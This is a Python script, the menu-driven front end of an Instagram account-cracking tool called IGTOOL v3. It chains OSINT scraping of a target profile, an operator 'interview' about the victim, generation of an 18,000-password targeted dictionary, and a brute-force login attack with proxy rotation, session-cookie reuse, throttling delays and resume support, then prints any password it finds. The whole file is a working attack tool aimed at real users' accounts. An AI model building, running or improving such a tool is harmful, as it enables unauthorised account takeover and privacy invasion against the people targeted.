#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IGTOOL v3 — Full suite
OSINT → Interview (your intel) → Targeted dictionary 18000 → Brute (progress)
"""

import os
import sys

from core.banner import (
    C, show_banner, clear, info, ok, warn, err, step, ask, yesno, menu,
)
from core.osint import OSINT
from core.interviewer import Interviewer
from core.wordlist import WordlistAI
from core.brute import BruteEngine
from core.api import InstagramAPI


def count_lines(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for ln in f if ln.strip())
    except Exception:
        return 0


def merge_hints(answers, hints, username):
    answers = dict(answers or {})
    hints = hints or {}
    answers["username"] = answers.get("username") or username
    answers["full_name"] = answers.get("full_name") or hints.get(
        "full_name", ""
    )
    answers["biography"] = hints.get(
        "biography", answers.get("biography", "")
    )
    answers["bio_tokens"] = hints.get("bio_tokens", [])
    answers["osint_tokens"] = hints.get("bio_tokens", [])
    answers["osint_years"] = hints.get("years", [])
    answers["years"] = hints.get("years", [])
    answers["phones"] = hints.get("phones") or answers.get("phones") or []
    answers["osint_phones"] = hints.get("phones", [])
    answers["user_parts"] = hints.get("user_parts", [])
    answers["stat_numbers"] = hints.get("stat_numbers", [])
    answers["followers"] = hints.get("followers", 0)
    answers["following"] = hints.get("following", 0)
    answers["posts"] = hints.get("posts", 0)
    answers["category"] = hints.get("category", "")
    answers["external_url"] = hints.get("external_url", "")
    return answers


def run_osint(username, output_dir, proxy):
    sid = os.environ.get("IG_SESSIONID") or None
    bot = OSINT(username, output_dir, proxy, sessionid=sid)
    data = bot.scrape()
    hints = bot.get_hints() if bot.data else {"username": username}
    hints["username"] = hints.get("username") or username
    return bot, data, hints


def gen_dict(answers, output_dir, username, count=18000):
    path = os.path.join(output_dir, username, "wordlist.txt")
    ai = WordlistAI(answers, target_count=count)
    info(f"Building dictionary from your intel → {count} target...")
    ai.generate()
    ai.save(path)
    ok(ai.report())
    ok(f"Saved → {path}")
    sample = sorted(ai.passwords)[:12]
    if sample:
        print(f"\n{C.W}Sample:{C.E}")
        for s in sample:
            print(f"  • {s}")
    return path, ai.count


def confirm(username, n):
    print(f"\n{C.R}  Test {n} passwords against @{username}{C.E}")
    return yesno("Continue?", default_yes=False)


def main():
    clear()
    show_banner()
    print(f"{C.W}── Target ──{C.E}\n")

    username = ask("Instagram username").strip().lstrip("@")
    if not username:
        err("Username required")
        sys.exit(1)

    output_dir = ask("Output directory", "output")
    os.makedirs(os.path.join(output_dir, username), exist_ok=True)

    warn("Proxy: leave EMPTY unless residential/working proxy")
    proxy = ask("Proxy URL (ENTER=none)", "") or None
    proxy_file = ask("Proxy list file (ENTER=none)", "") or None

    sid = ask("sessionid cookie (ENTER=skip)", "")
    if sid:
        os.environ["IG_SESSIONID"] = sid.strip()
        ok("sessionid set")
    elif os.environ.get("IG_SESSIONID"):
        info("Using IG_SESSIONID from env")

    info(f"Checking @{username}...")
    exists = InstagramAPI(proxy=proxy).profile_exists(username)
    if exists is False:
        err("Account not found / unreachable")
    elif exists:
        ok("Account reachable")
    else:
        warn("Could not verify — continue")

    while True:
        choice = menu(
            [
                "OSINT — name, bio, followers, posts",
                "DICTIONARY — Interview (your intel) → 18000 passwords",
                "BRUTE FORCE — live progress + current password",
                "FULL — OSINT → Interview → Dictionary → Brute",
                "RESUME previous brute",
                "PROXY CHECK",
                "EXIT",
            ],
            f"@ {username}",
        )

        wl = os.path.join(output_dir, username, "wordlist.txt")

        # 1 OSINT
        if choice == 1:
            step(1, 1, "OSINT")
            _, data, _ = run_osint(username, output_dir, proxy)
            if data:
                ok(f"Saved output/{username}/osint.json")
            ask("ENTER to return")
            clear()
            show_banner()
            continue

        # 2 DICTIONARY from YOUR intel
        if choice == 2:
            step(1, 3, "OSINT optional")
            if yesno("Try OSINT first?", default_yes=False):
                _, _, hints = run_osint(username, output_dir, proxy)
            else:
                hints = {"username": username}
                info("Skipped OSINT — dictionary will use interview only")

            step(2, 3, "INTERVIEW — عبي المعلومات")
            answers = Interviewer(username, hints, output_dir).run()
            answers = merge_hints(answers, hints, username)

            step(3, 3, "GENERATE DICTIONARY")
            try:
                n = int(ask("Dictionary size", "18000"))
            except ValueError:
                n = 18000
            gen_dict(answers, output_dir, username, n)
            ask("\nENTER to return")
            clear()
            show_banner()
            continue

        # 3 BRUTE
        if choice == 3:
            if not os.path.isfile(wl):
                warn("No dictionary found")
                if yesno("Build dictionary now from interview?", True):
                    hints = {"username": username}
                    if yesno("Try OSINT first?", False):
                        _, _, hints = run_osint(
                            username, output_dir, proxy
                        )
                    answers = Interviewer(
                        username, hints, output_dir
                    ).run()
                    answers = merge_hints(answers, hints, username)
                    wl, _ = gen_dict(answers, output_dir, username, 18000)
                else:
                    continue

            n = count_lines(wl)
            if n == 0:
                err("Empty dictionary")
                continue
            if not confirm(username, n):
                continue
            try:
                dmin = float(ask("Min delay sec", "3"))
                dmax = float(ask("Max delay sec", "5"))
            except ValueError:
                dmin, dmax = 3.0, 5.0
            found = BruteEngine(
                username, wl, output_dir, dmin, dmax, proxy, proxy_file
            ).run()
            if found:
                print(f"\n{C.G}{'═' * 40}{C.E}")
                print(f"{C.G}  PASSWORD: {found}{C.E}")
                print(f"{C.G}{'═' * 40}{C.E}")
            ask("ENTER to return")
            clear()
            show_banner()
            continue

        # 4 FULL
        if choice == 4:
            step(1, 4, "OSINT")
            _, _, hints = run_osint(username, output_dir, proxy)

            step(2, 4, "INTERVIEW")
            answers = Interviewer(username, hints, output_dir).run()
            answers = merge_hints(answers, hints, username)

            step(3, 4, "DICTIONARY")
            try:
                n = int(ask("Size", "18000"))
            except ValueError:
                n = 18000
            wl, cnt = gen_dict(answers, output_dir, username, n)

            if not confirm(username, cnt):
                warn("Dictionary saved — attack skipped")
                ask("ENTER")
                clear()
                show_banner()
                continue

            step(4, 4, "BRUTE")
            try:
                dmin = float(ask("Min delay", "3"))
                dmax = float(ask("Max delay", "5"))
            except ValueError:
                dmin, dmax = 3.0, 5.0
            found = BruteEngine(
                username, wl, output_dir, dmin, dmax, proxy, proxy_file
            ).run()
            if found:
                print(f"\n{C.G}  PASSWORD: {found}{C.E}")
            ask("ENTER")
            clear()
            show_banner()
            continue

        # 5 RESUME
        if choice == 5:
            prog = os.path.join(output_dir, username, "progress.json")
            if not os.path.isfile(prog):
                err("No progress to resume")
                ask("ENTER")
                continue
            if not os.path.isfile(wl):
                err("wordlist.txt missing")
                ask("ENTER")
                continue
            found = BruteEngine(
                username,
                wl,
                output_dir,
                proxy=proxy,
                proxy_file=proxy_file,
                resume=True,
            ).run()
            if found:
                print(f"\n{C.G}  PASSWORD: {found}{C.E}")
            ask("ENTER")
            clear()
            show_banner()
            continue

        # 6 PROXY
        if choice == 6:
            from core.proxy import ProxyManager

            pm = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
            if pm.count == 0:
                warn("No proxies — DIRECT is recommended")
            else:
                pm.validate_all()
                for p in pm._alive:
                    print(
                        f"  {C.G}ALIVE{C.E} {p['url']} ({p['latency']:.2f}s)"
                    )
                for p in pm._dead:
                    print(f"  {C.R}DEAD{C.E}  {p}")
            ask("ENTER")
            clear()
            show_banner()
            continue

        # 7 EXIT
        if choice == 7:
            print(f"\n{C.C}Bye.{C.E}\n")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] stop{C.E}")
        sys.exit(0)
